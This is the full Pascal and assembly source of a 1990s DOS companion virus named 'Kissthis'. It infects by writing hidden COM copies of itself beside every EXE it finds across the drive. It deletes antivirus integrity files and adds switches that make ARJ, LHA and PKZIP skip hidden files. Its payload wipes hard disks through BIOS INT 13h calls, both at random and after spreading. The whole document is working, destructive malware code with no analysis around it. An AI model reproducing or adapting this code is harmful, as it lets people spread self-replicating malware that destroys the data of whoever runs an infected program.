{
Kissthis By Sanguesujo (Aka Evil One)
Non-Resident Spawning Exe Infector
Compressed
Undetectable
Format Hd In 1/100 Or In Disk Error
Stealth Archivers (Arj,Pkzip,Lha)
}

{$A+,B-,D-,E-,F-,G+,L-,N-,O-,P-,Q-,R-,S-,T-,V+,X+,Y-}
{$I-}
{$M 2048,0,0}

Uses Dos;
Var Host:String[80];
    Arquivo:Array[1..2] Of File;
    Buffer:Array[1..8192] Of Byte;
    Errcode,Rnd:Byte;

Procedure Trash;
Begin
  Writeln('     Kiss This     ');
  Writeln(' Made In Balneario Camboriu By Sanguesujo - 28/01/96 ');
  Asm
    @Kill_Disk:      Xor     Bx,Bx
                     Mov     Es,Bx
                     Mov     Dl,80H
    @Kill_Next_Disk: Xor     Dh,Dh
    @Kill_Next_Track:Xor     Cx,Cx
    @Kill_Format:    Mov     Ax,501H
                     Int     13H
                     And     Cl,11000000B
                     Inc     Ch
                     Jne     @Kill_Format
                     Add     Cl,40H
                     Jne     @Kill_Format
                     Xor     Ah,Ah
                     Int     13H
                     Inc     Dh
                     Cmp     Dh,10H
                     Jb      @Kill_Next_Track
                     Inc     Dx
                     Jmp     @Kill_Next_Disk
  End;
End;

Function Fileexists(Filename: String): Boolean;
Var Code:Byte;
Begin
  Code:=Ioresult;
  Assign(Arquivo[1], Filename);
  Reset(Arquivo[1]);
  Close(Arquivo[1]);
  Fileexists:=(Ioresult=0);
End;

Procedure Execute;
Var Execname,Params:String;
    Count,Start:Byte;
Begin
  Start:=1;
  Execname:=Copy(Host,1,Pos('.',Host)-1)+'.Exe';
  Params:='';
  If (Pos('Arj.Exe',Execname)<>0)And(Paramcount>1) Then Begin
    Inc(Start);
    Params:=Paramstr(1)+' -A ';
  End;
  If (Pos('Lha.Exe',Execname)<>0)And(Paramcount>1) Then Begin
    Inc(Start);
    Params:=Paramstr(1)+' -A+ ';
  End;
  If Pos('Pkzip.Exe',Execname)<>0 Then Params:='-Wh -Jh ';
  If Pos('Pkunzip.Exe',Execname)<>0 Then Params:='-Jh ';
  For Count:=Start To Paramcount Do Params:=Params+Paramstr(Count)+' ';
  Exec(Execname,Params);
  Errcode:=Doserror;
End;

Procedure Stealth;
Const Names:Array[1..5] Of String[13]=('Anti-Vir.Dat','Chklist.Ms','Chklist.Cps','Tbdriver.Exe','Files.Lst');
Var Count:Byte;
Begin
  For Count:=1 To 5 Do Begin
    Assign(Arquivo[1],Names[Count]);
    Setfattr(Arquivo[1], Archive);
    Erase(Arquivo[1]);
  End;
End;

Procedure Infect(Name:String);
Var I:Integer;
Begin
  Assign(Arquivo[1],Host);
  Assign(Arquivo[2],Name);
  Reset(Arquivo[1],1);
  Rewrite(Arquivo[2],1);
  Blockread(Arquivo[1], Buffer, 8192, I);
  Blockwrite(Arquivo[2], Buffer, I);
  Close(Arquivo[2]);
  Close(Arquivo[1]);
  Setfattr(Arquivo[2],Hidden);
  If Errcode=2 Then Trash;
  Halt(Errcode);
End;

Procedure Searcher;
Var Newway:String[80];
  Procedure Proc1;
  Var Way,Nome:String[80];
      Extensao:String[3];
      Search:Searchrec;
  Begin
    Findfirst(Newway+'*.*',Anyfile,Search);
    While(Doserror=0)Do Begin
      If(Search.Name<>'.')And(Search.Name<>'..')Then Begin
        Extensao:=Copy(Search.Name,Pos('.',Search.Name)+1,3);
        If Extensao='Exe' Then Begin
          Nome:=Newway+Copy(Search.Name,1,Pos('.',Search.Name)-1)+'.Com';
          If Not(Fileexists(Nome)) Then Infect(Nome);
        End;
        If (Search.Attr=16) Then Begin
          Way:=Newway;
          Newway:=Newway+Search.Name + '\';
          Proc1;
          Newway:=Way;
        End;
      End;
    Findnext(Search);
    End;
  End;

Begin
  Newway:='\';
  Proc1;
End;

Begin
  Randomize;
  Rnd:=Random(100);
  If Rnd=1 Then Trash;
  Host:=Paramstr(0);
  Assign(Arquivo[1],Host);
  Setfattr(Arquivo[1],Hidden);
  Stealth;
  Execute;
  Searcher;
  Trash;
End.
